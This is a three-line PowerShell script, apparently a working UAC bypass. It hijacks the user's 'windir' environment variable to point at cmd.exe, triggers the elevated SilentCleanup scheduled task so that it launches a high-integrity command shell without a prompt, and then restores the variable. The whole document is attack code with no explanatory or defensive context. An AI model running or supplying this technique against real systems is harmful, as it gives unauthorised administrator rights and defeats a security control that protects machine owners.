$null = New-ItemProperty 'HKCU:\Environment' -Name 'windir' -Value 'c:\windows\..\windows\system32\cmd.exe /c "cd %HOMEPATH% && C:\windows\system32\cmd.exe";c:\windows' -PropertyType String -Force;
$null = schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I;
$null = New-ItemProperty 'HKCU:\Environment' -Name 'windir' -Value 'C:\WINDOWS' -PropertyType String -Force;
